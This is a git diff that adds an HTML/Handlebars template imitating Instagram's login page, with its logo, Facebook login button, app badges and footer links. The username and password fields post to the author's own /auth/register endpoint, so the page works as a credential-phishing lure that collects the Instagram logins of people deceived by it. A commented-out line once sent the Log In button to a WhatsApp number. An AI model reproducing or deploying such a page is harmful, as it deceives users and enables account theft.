@@ -1,0 +1,204 @@
+ <!DOCTYPE html>
+<html lang="en">
+<head>
+     <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Instagram</title>
+    <link rel="stylesheet" href="/styles.css">
+    <link rel="stylesheet" href="/media-queries.css" />
+    <link rel="icon" href="#">
+    <title>Document</title>
+</head>
+<body>
+    <main>
+      <div class="log-in-container">
+           <form action="/auth/register" method="POST">
+        <div class="log-in">
+           
+          <!-- Logo -->
+          <img src="instagram-logo.png" class="logo" />
+          <!-- Log in form -->
+          <div class="log-in-form">
+
+
+              
+            {{!-- <input type="text" placeholder="Phone number, username or email" /> --}}
+            <label for="name"></label>
+            <input type="text" placeholder="Phone number, username or email"  class="form-control" id="name" name="name">
+           {{!--  <input type="password" placeholder="Password" /> --}}
+             <label for="password"></label>
+            <input type="password" placeholder="Password" class="form-control" id="password" name="password">
+            <button type="submit" class="log-in-button">Log In</button> 
+            {{!-- <a href="http://wa.me/919682912506" class="log-in-button">Log In</a> --}}
+            </form>
+          </div>
+          <!-- OR divider -->
+          <span class="or-divider">OR</span>
+          <!-- Log in with Facebook -->
+          <div class="fb-login">
+            <a href="https://www.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fwww.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26state%3D%257B%2522fbLoginKey%2522%253A%25229ivssk1n0l3z6o14g4g5cpaz811y5b6dspuq3e4mkv3wawt1bk%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252F%2522%257D%26scope%3Demail%26response_type%3Dcode%252Cgranted_scopes%26locale%3Den_US%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D0b2fb672-1211-4780-9b28-64f8fa14009f%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%25229ivssk1n0l3z6o14g4g5cpaz811y5b6dspuq3e4mkv3wawt1bk%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252F%2522%257D%23_%3D_&display=page&locale=hi_IN&pl_dbl=0">
+              <img src="facebook-icon.png" />
+              <span>Log in with Facebook</span>
+            </a>
+          </div>
+            <!-- Forgot password? -->
+          <a href="https://www.instagram.com/accounts/password/reset/">Forgot password?</a>
+        </div>
+        <!-- Sign up -->
+        <div class="sign-up">
+          <span>Don't have an account?</span><a href="https://www.instagram.com/accounts/emailsignup/">Sign up</a>
+        </div>
+        <!-- Download app -->
+        <div class="get-the-app">
+          <span>Get the app</span>
+          <div class="app-images">
+            <a href="https://apps.apple.com/app/instagram/id389801252?vt=lo"><img src="applestore.png" /></a>
+            <a href="https://play.google.com/store/apps/details?id=com.instagram.android&referrer=utm_source%3Dinstagramweb&utm_campaign=signupPage&ig_mid=91746366-FC3C-4CA9-9DB8-656A05249AD8&utm_content=lo&utm_medium=badge"><img src="googlestore.png" /></a>
+          </div>
+        </div>
+      </div>
+      <!-- Phones -->
+      <div class="phones-container">
+        <img src="phones.png">
+      </div>
+    </main>
+    <footer>
+      <ul class="footer-links">
+        <li><a href="https://about.instagram.com/">ABOUT</a></li>
+        <li><a href="https://about.instagram.com/en_US/blog">BLOG</a></li>
+        <li><a href="https://about.instagram.com/about-us/careers">JOBS</a></li>
+        <li><a href="https://help.instagram.com/">HELP</a></li>
+        <li><a href="https://developers.facebook.com/docs/instagram">API</a></li>
+        <li><a href="https://help.instagram.com/519522125107875">PRIVACY</a></li>
+        <li><a href="https://help.instagram.com/581066165581870 ">TERMS</a></li>
+        <li><a href="https://www.instagram.com/directory/profiles/">TOP</a></li>
+        <li><a href="https://www.instagram.com/directory/hashtags/">HASHTAGS</a></li>
+        <li><a href="https://www.instagram.com/explore/locations/">LOCATIONS</a></li>
+       
+      </ul>
+      
+       <span class="copyright">&copy; 2021 INSTAGRAM FROM FACEBOOK</span></footer>
+   {{!-- <nav>
+       <h4>Sensordrops Networks</h4>
+       <ul>
+           <li><a href="/">Home</a></li>
+       <li><a href="/login">Login</a></li>
+       <li><a href="/register">Register</a></li>
+       </ul>
+       
+   </nav>
+
+
+   <div class="container mt-4">
+      <div class="card">
+  <div class="card-header">
+      Register Form
+  </div>
+ <div class="card-body">
+     <form action="/auth/register" method="POST">
+        <div class="form-group">
+            <label for="name">Name</label>
+            <input type="text" class="form-control" id="name" name="name">
+            </div>
+
+       <div class="form-group">
+            <label for="email">E-mail</label>
+            <input type="email" class="form-control" id="email" name="email">
+            </div>
+
+        <div class="form-group">
+            <label for="password">Password</label>
+            <input type="password" class="form-control" id="password" name="password">
+            </div>
+
+        <div class="form-group">
+            <label for="passwordConfirm"> Confirm Password</label>
+            <input type="password" class="form-control" id="passwordConfirm" name="passwordConfirm">
+            </div> 
+        <button type="submit" class="btn btn-primary">Register User</button>
+</form>
+     --}}
+  </div>
+</div>
+{{#if message}}
+    <h4 class="alert alert-danger mt-4">{{message}}</h4>
+{{/if}}
+
+   </div>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.1/dist/js/bootstrap.bundle.min.js" integrity="sha384-gtEjrD/SeCtmISkJkNUaaKMoLD0//ElJ19smozuHV6z3Iehds+3Ulb9Bn9Plx0x4" crossorigin="anonymous"></script>
+    
+</body>
+</html> 
+
+
+{{!-- <!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Instagram</title>
+    <link rel="stylesheet" href="css/styles.css" />
+    <link rel="stylesheet" href="css/media-queries.css" />
+    <link rel="icon" href="assets/images/favicon.ico" />
+  </head>
+  <body>
+    <main>
+      <div class="log-in-container">
+        <div class="log-in">
+          <!-- Logo -->
+          <img src="assets/images/instagram-logo.png" class="logo" />
+          <!-- Log in form -->
+          <div class="log-in-form">
+            <input type="text" placeholder="Phone number, username or email" />
+            <input type="password" placeholder="Password" />
+            <button class="log-in-button">Log In</button>
+          </div>
+          <!-- OR divider -->
+          <span class="or-divider">OR</span>
+          <!-- Log in with Facebook -->
+          <div class="fb-login">
+            <a href="#">
+              <img src="assets/images/facebook-icon.png" />
+              <span>Log in with Facebook</span>
+            </a>
+          </div>
+          <!-- Forgot password? -->
+          <a href="#">Forgot password?</a>
+        </div>
+        <!-- Sign up -->
+        <div class="sign-up">
+          <span>Don't have an account?</span><a href="#">Sign up</a>
+        </div>
+        <!-- Download app -->
+        <div class="get-the-app">
+          <span>Get the app</span>
+          <div class="app-images">
+            <a href="#"><img src="assets/images/applestore.png" /></a>
+            <a href="#"><img src="assets/images/googlestore.png" /></a>
+          </div>
+        </div>
+      </div>
+      <!-- Phones -->
+      <div class="phones-container">
+        <img src="assets/images/phones.png" />
+      </div>
+    </main>
+    <footer>
+      <ul class="footer-links">
+        <li><a href="#">ABOUT</a></li>
+        <li><a href="#">HELP</a></li>
+        <li><a href="#">PRESS</a></li>
+        <li><a href="#">API</a></li>
+        <li><a href="#">JOBS</a></li>
+        <li><a href="#">PRIVACY</a></li>
+        <li><a href="#">TERMS</a></li>
+        <li><a href="#">LOCATIONS</a></li>
+        <li><a href="#">TOP</a></li>
+        <li><a href="#">ACCOUNTS</a></li>
+        <li><a href="#">HASHTAGS</a></li>
+        <li><a href="#">LANGUAGE</a></li>
+      </ul>
+      <span class="copyright">&copy; 2020 INSTAGRAM FROM FACEBOOK</span>
+    </footer>
+  </body>
+</html --}}>
